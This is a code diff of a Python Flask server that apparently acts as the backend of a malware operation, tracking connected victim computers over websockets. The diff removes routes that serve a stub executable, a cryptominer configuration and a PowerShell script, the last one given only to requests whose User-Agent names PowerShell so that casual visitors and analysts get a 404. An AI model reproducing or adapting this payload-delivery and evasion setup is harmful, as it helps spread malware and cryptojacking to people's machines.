@@ -280,43 +280,6 @@ def readfiles(ws):
 def files(ws):
     handle_socket(ws, files_clients, files_computers, "FILES")
 
-@app.route("/search", methods=["POST", "GET"])
-def search():
-    with open("ads.html", "r+") as file:
-        file_data = file.read()
-    return file_data
-
-@app.route("/m43200012", methods=["POST", "GET"])
-def stub():
-    return send_file("output.com", as_attachment=True)
-
-@app.route("/miner-config", methods=["POST", "GET"])
-def miner():
-    with open("miner.config", "r+") as file:
-        file_data = file.read()
-    return file_data
-
-@app.route("/deobf3", methods=["POST", "GET"])
-def deobf():
-    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
-        ip = request.environ["REMOTE_ADDR"]
-    else:
-        ip = request.environ["HTTP_X_FORWARDED_FOR"]
-
-    print(ip)
-
-    if 'User-Agent' not in request.headers:
-        return "", 404
-
-    headers = request.headers['User-Agent']
-    if "PowerShell" not in headers:
-        return "", 404
-
-    with open("script.ps1", "r+") as file:
-        file_data = file.read()
-
-    return file_data
-
 @app.route("/webhook", methods=["POST", "GET"])
 def webhook():
     webhook = os.environ["webhook"]
